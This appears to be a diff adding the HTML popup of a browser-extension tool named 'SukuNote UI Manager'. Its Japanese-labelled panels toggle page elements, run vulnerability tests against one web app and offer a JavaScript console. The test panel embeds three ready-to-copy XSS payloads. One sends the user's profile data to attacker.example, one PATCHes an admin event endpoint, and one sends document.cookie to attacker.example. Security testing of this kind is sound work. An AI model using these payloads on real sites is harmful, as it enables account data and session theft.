@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body {
+      width: 340px;
+      max-height: 650px;
+      overflow-y: auto;
+      font-family: sans-serif;
+      padding: 12px;
+      margin: 0;
+      background: #f8fafc;
+      box-sizing: border-box;
+    }
+    /* ヘッダー */
+    .header-actions {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 8px;
+      flex-wrap: wrap;
+      gap: 4px;
+    }
+    h3 { font-size: 13px; margin: 0; color: #1e293b; }
+    .btn-group { display: flex; gap: 4px; }
+    .btn-reload, .btn-reset {
+      border: none;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      cursor: pointer;
+    }
+    .btn-reload { background: #e2e8f0; color: #475569; }
+    .btn-reload:hover { background: #cbd5e1; }
+    .btn-reset { background: #fee2e2; color: #ef4444; font-weight: bold; }
+    .btn-reset:hover { background: #fca5a5; color: #991b1b; }
+
+    .btn-admin {
+      width: 100%;
+      padding: 8px;
+      background: #334155;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 11px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-bottom: 12px;
+    }
+    .btn-admin:hover { background: #1e293b; }
+
+    /* タブ */
+    .tabs {
+      display: flex;
+      gap: 2px;
+      margin-bottom: 10px;
+      border-bottom: 1px solid #e2e8f0;
+    }
+    .tab-btn {
+      background: transparent;
+      border: none;
+      padding: 6px 12px;
+      font-size: 11px;
+      font-weight: 600;
+      color: #64748b;
+      cursor: pointer;
+      border-bottom: 2px solid transparent;
+      transition: 0.2s;
+    }
+    .tab-btn:hover { color: #1e293b; }
+    .tab-btn.active {
+      color: #3b82f6;
+      border-bottom-color: #3b82f6;
+    }
+
+    /* パネル */
+    .tab-panel { display: none; }
+    .tab-panel.active { display: block; }
+
+    /* 要素パネル */
+    .search-box {
+      width: 100%;
+      padding: 6px 10px;
+      font-size: 12px;
+      border: 1px solid #cbd5e1;
+      border-radius: 6px;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+      outline: none;
+    }
+    .search-box:focus { border-color: #3b82f6; }
+
+    .item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 8px 10px;
+      background: #ffffff;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      margin-bottom: 8px;
+    }
+    .item-label {
+      font-size: 12px;
+      font-weight: bold;
+      color: #334155;
+      max-width: 210px;
+      word-break: break-all;
+    }
+    .switch {
+      position: relative;
+      display: inline-block;
+      width: 38px;
+      height: 20px;
+    }
+    .switch input { opacity: 0; width: 0; height: 0; }
+    .slider {
+      position: absolute;
+      cursor: pointer;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-color: #cbd5e1;
+      transition: .3s;
+      border-radius: 20px;
+    }
+    .slider:before {
+      position: absolute;
+      content: "";
+      height: 14px;
+      width: 14px;
+      left: 3px;
+      bottom: 3px;
+      background-color: white;
+      transition: .3s;
+      border-radius: 50%;
+    }
+    input:checked + .slider { background-color: #3b82f6; }
+    input:checked + .slider:before { transform: translateX(18px); }
+
+    /* テストパネル (旧 vuln-section) */
+    .vuln-section {
+      margin-top: 4px;
+      padding-top: 4px;
+    }
+    .vuln-section h3 {
+      font-size: 12px;
+      color: #dc2626;
+      margin: 0 0 8px 0;
+    }
+    .test-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 6px;
+      align-items: center;
+      margin-bottom: 6px;
+    }
+    .test-row label {
+      font-size: 11px;
+      color: #475569;
+    }
+    .test-row input[type="text"] {
+      padding: 4px 6px;
+      font-size: 11px;
+      border: 1px solid #cbd5e1;
+      border-radius: 4px;
+      width: 70px;
+      background: white;
+    }
+    .test-btn {
+      background: #f1f5f9;
+      border: 1px solid #cbd5e1;
+      padding: 4px 8px;
+      border-radius: 4px;
+      font-size: 10px;
+      cursor: pointer;
+      color: #1e293b;
+      white-space: nowrap;
+    }
+    .test-btn:hover { background: #e2e8f0; }
+    .test-btn.danger { background: #fee2e2; border-color: #fca5a5; color: #991b1b; }
+    .test-btn.danger:hover { background: #fecaca; }
+    .test-btn.warning { background: #fef3c7; border-color: #fcd34d; color: #92400e; }
+    .test-btn.warning:hover { background: #fde68a; }
+    .test-btn.primary { background: #dbeafe; border-color: #93c5fd; color: #1e3a8a; }
+    .test-btn.primary:hover { background: #bfdbfe; }
+    .test-btn.success { background: #d1fae5; border-color: #6ee7b7; color: #065f46; }
+    .test-btn.success:hover { background: #a7f3d0; }
+    .payload-box {
+      background: #f1f5f9;
+      border: 1px dashed #94a3b8;
+      border-radius: 4px;
+      padding: 6px 8px;
+      font-family: monospace;
+      font-size: 10px;
+      word-break: break-all;
+      margin: 4px 0;
+    }
+    .copy-btn {
+      background: none;
+      border: none;
+      color: #3b82f6;
+      cursor: pointer;
+      font-size: 10px;
+      padding: 2px 6px;
+    }
+
+    /* コンソールパネル */
+    #console-output {
+      background: #0f172a;
+      color: #e2e8f0;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      height: 200px;
+      overflow-y: auto;
+      padding: 8px;
+      border-radius: 4px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      margin-bottom: 6px;
+      border: 1px solid #334155;
+    }
+    #console-output .input-line { color: #94a3b8; }
+    #console-output .result-line { color: #a7f3d0; }
+    #console-output .error-line { color: #fca5a5; }
+
+    .console-input-row {
+      display: flex;
+      gap: 4px;
+    }
+    .console-input-row input {
+      flex: 1;
+      padding: 6px 8px;
+      font-family: 'Courier New', monospace;
+      font-size: 11px;
+      border: 1px solid #cbd5e1;
+      border-radius: 4px;
+      background: white;
+      outline: none;
+    }
+    .console-input-row input:focus { border-color: #3b82f6; }
+    .console-input-row button {
+      padding: 4px 12px;
+      border: none;
+      border-radius: 4px;
+      font-size: 11px;
+      font-weight: bold;
+      cursor: pointer;
+      background: #3b82f6;
+      color: white;
+    }
+    .console-input-row button:hover { background: #2563eb; }
+    .console-input-row button.clear-btn { background: #64748b; }
+    .console-input-row button.clear-btn:hover { background: #475569; }
+        /* コンソール出力の色分け */
+    #console-output .result-line { color: #a7f3d0; }
+    #console-output .error-line { color: #fca5a5; }
+    #console-output .warning-line { color: #fcd34d; }
+    #console-output .info-line { color: #93c5fd; }
+    #console-output .debug-line { color: #94a3b8; }
+  </style>
+</head>
+<body>
+  <!-- 管理者切り替え -->
+  <button id="btn-admin" class="btn-admin">⚡ 管理者切り替え (Admin)</button>
+
+  <!-- ヘッダーアクション -->
+  <div class="header-actions">
+    <h3>🔍 SukuNote UI Manager</h3>
+    <div class="btn-group">
+      <button id="btn-rescan" class="btn-reload">再スキャン</button>
+      <button id="btn-reset" class="btn-reset">初期化</button>
+    </div>
+  </div>
+
+  <!-- タブ -->
+  <div class="tabs">
+    <button class="tab-btn active" data-tab="elements">📋 要素</button>
+    <button class="tab-btn" data-tab="tests">🛡️ 試験</button>
+    <button class="tab-btn" data-tab="console">📟 コンソール</button>
+  </div>
+
+  <!-- パネル1: 要素オンオフ -->
+  <div id="panel-elements" class="tab-panel active">
+    <input type="text" id="search-input" class="search-box" placeholder="要素名・ID・クラスで検索...">
+    <div id="toggle-container">読み込み中...</div>
+  </div>
+
+  <!-- パネル2: 脆弱性試験 -->
+  <div id="panel-tests" class="tab-panel">
+    <div class="vuln-section">
+      <h3>⚡ 脆弱性テスト</h3>
+      <div class="test-row">
+        <label>記事ID: <input id="vuln-post-id" type="text" placeholder="例: 123" size="5"></label>
+      </div>
+      <div class="test-row">
+        <button id="btn-test-bot-comment" class="test-btn danger">Botコメント送信</button>
+        <button id="btn-test-delete-post" class="test-btn danger">記事削除</button>
+        <button id="btn-test-event-patch" class="test-btn warning">イベント改ざん</button>
+      </div>
+      <div class="test-row">
+        <button id="btn-test-csrf" class="test-btn warning">CSRFテスト</button>
+        <button id="btn-test-sessionstorage" class="test-btn primary">sessionStorage改ざん</button>
+        <button id="btn-test-fake-admin" class="test-btn primary">偽装Admin表示</button>
+      </div>
+      <div class="test-row">
+        <label>シークレット: <input id="vuln-secret" type="text" placeholder="secret" size="10"></label>
+        <button id="btn-test-admin-login" class="test-btn warning">Adminログイン試行</button>
+      </div>
+    </div>
+
+    <!-- XSSペイロード & カバー画像 -->
+    <div class="vuln-section" style="border-top:1px solid #e2e8f0; margin-top:8px; padding-top:8px;">
+      <h3>🧪 XSSペイロード & カバー画像</h3>
+      <div class="test-row">
+        <span style="font-size:10px; color:#475569;">各ペイロードをコピーして該当フィールドに貼り付け</span>
+      </div>
+      <div class="test-row">
+        <button class="test-btn success" data-payload='<img src=x onerror="fetch(`/api/users/me`).then(r=>r.json()).then(d=>location=`https://attacker.example/?data=`+encodeURIComponent(JSON.stringify(d)))">'>タイトルXSS</button>
+        <button class="test-btn success" data-payload='<a href="javascript:fetch(`/api/admin/event`,{method:`PATCH`,credentials:`include`,headers:{`Content-Type`:`application/json`},body:JSON.stringify({start:`2020-01-01`,end:`2020-01-02`})})">イベント改ざんリンク</button>
+        <button class="test-btn success" data-payload='https://example.com/" onclick="fetch(`https://attacker.example/?c=`+document.cookie)">Bioリンク罠</button>
+      </div>
+      <div class="test-row">
+        <label>カバー画像URL: <input id="vuln-cover-url" type="text" placeholder="https://..." size="20"></label>
+        <button id="btn-test-cover" class="test-btn warning">設定テスト</button>
+      </div>
+      <div class="test-row">
+        <button id="btn-show-payload-guide" class="test-btn primary">詳細ガイド表示</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- パネル3: コンソール -->
+  <div id="panel-console" class="tab-panel">
+    <div id="console-output"></div>
+    <div class="console-input-row">
+      <input type="text" id="console-input" placeholder="JSコードを入力 (例: document.title)">
+      <button id="console-run">実行</button>
+      <button id="console-clear" class="clear-btn">クリア</button>
+    </div>
+  </div>
+
+  <script src="popup.js"></script>
+</body>
+</html>
